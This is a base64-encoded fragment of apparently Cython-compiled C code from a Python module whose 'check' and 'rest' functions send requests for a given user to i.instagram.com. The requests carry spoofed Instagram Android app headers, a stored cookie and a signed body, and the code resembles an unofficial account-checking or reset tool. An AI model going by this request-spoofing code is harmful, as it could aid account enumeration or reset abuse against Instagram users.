CBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzQsICgxLV9fcHl4X3RfNCkgfCAoX19weXhfdF80Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNTAsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIH0KICBfX3B5eF9MMzo7CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LmNoZWNrIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl91YSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Rldik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RldmljZV9pZCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3V1aSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJhd18xM3Jlc3QoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yYXdfMTNyZXN0ID0geyJyZXN0IiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18yYXdfMTNyZXN0LCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJhd18xM3Jlc3QoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X3VzZXIgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicmVzdCAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VyLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDI1MywgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJyZXN0IiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyZXN0IiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCAyNTMsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjUzLCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3ZfdXNlciA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgicmVzdCIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDI1MywgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJhd18xMnJlc3QoX19weXhfc2VsZiwgX19weXhfdl91c2VyKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfMTJyZXN0KENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3VzZXIpIHsKICBQeU9iamVjdCAqX19weXhfdl9oZWFkZXJzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9yZXNwb25zZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzExOwogIGludCBfX3B5eF90XzEyOwogIGludCBfX3B5eF90XzEzOwogIGNoYXIgY29uc3QgKl9fcHl4X3RfMTQ7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE5ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yMCA9IE5VTEw7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicmVzdCIsIDApOwoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMTkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX1BpZ2Vvbl9TZXNzaW9uX0lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzUwY2M2ODYxXzcwMzZfNDNiNF84MDJlX2ZiNDI4Mjc5KSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9QaWdlb25fUmF3Y2xpZW50dGltZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xNzAwMjUxNTc0Xzk4MikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQ29ubmVjdGlvbl9TcGVlZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xa2JwcykgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQmFuZHdpZHRoX1NwZWVkX0tCUFMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMV8wMDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0JhbmR3aWR0aF9Ub3RhbEJ5dGVzX0IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQmFuZHdpZHRoX1RvdGFsVGltZV9NUywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9CbG9rc19WZXJzaW9uX0lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYzgwYzVmYjMwZGZhZTllMjczZTQwMDlmMDNiMTgyODApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0Nvbm5lY3Rpb25fVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1dJRkkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0NhcGFiaWxpdGllcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zYnJUdncpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0FwcF9JRCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV81NjcwNjczNDMzNTI0MjcpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI2NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcl9hZ2VudF9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9JbnN0YWdyYW1fMTAwXzBfMF8xN18xMjlfQW5kcm9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9BY2NlcHRfTGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fR0JfZW5fVVMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llX2hlYWRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyNzEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nvb2tpZV92YWx1ZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfdF81LCBfX3B5eF90XzcpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb250ZW50X3R5cGVfaGVhZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29udGVudF90eXBlX2Zvcm0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyNzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3RfNSwgX19weXhfdF82KSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9BY2NlcHRfRW5jb2RpbmcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ3ppcF9kZWZsYXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Ib3N0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2lfaW5zdGFncmFtX2NvbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfRkJfSFRUUF9FbmdpbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9MaWdlcikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29ubmVjdGlvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9rZWVwX2FsaXZlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQ29udGVudF9MZW5ndGgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzU2KSA8ICgwKSkgX19QWVhfRVJSKDAsIDI1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyODAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NpZ25lZF9ib2R5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjgwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgIC